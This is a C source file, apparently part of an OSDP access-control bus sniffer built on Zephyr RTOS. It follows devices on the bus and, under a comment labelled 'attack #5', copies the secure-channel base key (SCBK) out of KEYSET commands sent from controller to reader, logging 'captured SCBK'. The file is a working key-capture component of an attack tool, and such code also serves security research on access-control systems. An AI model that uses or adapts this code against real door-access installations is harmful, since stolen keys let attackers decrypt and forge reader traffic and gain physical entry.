#include "secchan.h"

#include <string.h>
#include <zephyr/logging/log.h>

LOG_MODULE_REGISTER(secchan, CONFIG_LOG_DEFAULT_LEVEL);

#define OSDP_CMD_KEYSET		0x75

/*
 * KEYSET payload layout (per OSDP spec, see also goToMain/libosdp source):
 *   [0]   key type (0x01 = SCBK)
 *   [1]   key length (0x10 for AES-128)
 *   [2..] key bytes
 *
 * We sit at offset OSDP_OFF_CMD+1 inside the parsed frame (one byte past
 * the command byte) when checking the data area.
 */
#define OSDP_KEYSET_TYPE_SCBK		0x01
#define OSDP_KEYSET_HDR_LEN		2

static secchan_pd_state_t g_pds[SECCHAN_TRACK_ADDRS];
static size_t g_pd_count;

static secchan_pd_state_t *find_or_alloc(uint8_t address)
{
	for (size_t i = 0; i < g_pd_count; i++) {
		if (g_pds[i].address == address) {
			return &g_pds[i];
		}
	}
	if (g_pd_count >= SECCHAN_TRACK_ADDRS) {
		return NULL;
	}
	secchan_pd_state_t *p = &g_pds[g_pd_count++];
	memset(p, 0, sizeof(*p));
	p->address = address;
	return p;
}

void secchan_init(void)
{
	memset(g_pds, 0, sizeof(g_pds));
	g_pd_count = 0;
}

void secchan_observe(const osdp_frame_t *frame)
{
	if (!frame || frame->length < OSDP_MIN_FRAME_LEN) {
		return;
	}

	uint8_t addr = frame->address & ~OSDP_ADDR_REPLY_BIT;
	secchan_pd_state_t *pd = find_or_alloc(addr);
	if (!pd) {
		return;
	}

	if (frame->flags & OSDP_FRAME_FLAG_ENCRYPTED) {
		pd->sc_active = true;
	}

	/*
	 * KEYSET extraction (attack #5, spec §0). Only meaningful for
	 * CP→PD direction with command byte 0x75 and a payload that
	 * looks like an SCBK key blob.
	 */
	if (frame->direction == OSDP_DIR_CP_TO_PD
	    && frame->cmd_or_reply == OSDP_CMD_KEYSET
	    && frame->length >= OSDP_OFF_CMD + 1 + OSDP_KEYSET_HDR_LEN
				    + SECCHAN_KEY_LEN + 2 /* CRC */) {
		const uint8_t *payload = frame->bytes + OSDP_OFF_CMD + 1;
		uint8_t type = payload[0];
		uint8_t len = payload[1];
		if (type == OSDP_KEYSET_TYPE_SCBK && len == SECCHAN_KEY_LEN) {
			memcpy(pd->scbk, payload + OSDP_KEYSET_HDR_LEN,
			       SECCHAN_KEY_LEN);
			pd->scbk_known = true;
			LOG_WRN("captured SCBK for address 0x%02x", addr);
		}
	}
}

const uint8_t *secchan_get_scbk(uint8_t address)
{
	uint8_t a = address & ~OSDP_ADDR_REPLY_BIT;
	for (size_t i = 0; i < g_pd_count; i++) {
		if (g_pds[i].address == a && g_pds[i].scbk_known) {
			return g_pds[i].scbk;
		}
	}
	return NULL;
}

size_t secchan_dump(secchan_pd_state_t *out, size_t cap)
{
	size_t n = (g_pd_count < cap) ? g_pd_count : cap;
	memcpy(out, g_pds, n * sizeof(*out));
	return n;
}
